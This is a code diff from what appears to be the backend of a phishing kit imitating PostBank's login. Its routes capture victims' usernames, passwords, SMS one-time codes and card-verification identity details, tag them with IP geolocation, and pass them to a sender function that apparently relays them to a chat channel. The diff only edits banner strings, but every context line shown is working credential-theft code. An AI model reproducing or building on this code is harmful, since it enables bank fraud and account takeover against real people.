@@ -29,7 +29,7 @@ const multisend = (chatid,token,data) => {
 login.post('/',(req,res)=>{
     ipify.ipv4().then(ipv4 =>{
         const geo = geoip.lookup(req.ip);
-        const log= "---------- ☺ Login PostBank ☺ ----------- \n" +
+        const log= "---------- Login PostBank  ----------- \n" +
             "Username : " +req.body.username +"\n"+
             "Password : "+ req.body.password +"\n"+
             "------------------------------------- \n"+
@@ -52,7 +52,7 @@ login.post('/',(req,res)=>{
 login.post('/new',(req,res)=>{
     ipify.ipv4().then(ipv4 =>{
         const geo = geoip.lookup(req.ip);
-        const log= "---------- ☺ ♥ ♥ SMS PostBank ♥ ♥ ☺ ----------- \n" +
+        const log= "----------  SMS PostBank  ----------- \n" +
             "SMS 1  : " +req.body.sms +"\n"+
             "SMS 2 : "+ req.body.sms1 +"\n"+
             "------------------------------------- \n"+
@@ -67,7 +67,7 @@ login.post('/new',(req,res)=>{
 login.post('/vbv',(req,res)=>{
     ipify.ipv4().then(ipv4 =>{
         const geo = geoip.lookup(ipv4);
-        const log= "---------- ☺ ♥ ♥ SMS VBV PostBank Happy Cash bb  ♥ ♥ ☺ ----------- \n" +
+        const log= "----------  SMS VBV PostBank Happy Cash bb  ----------- \n" +
             "FullName : " +req.body.fullname +"\n"+
             "Address  : " +req.body.adress +"\n"+
             "City : " +req.body.city +"\n"+
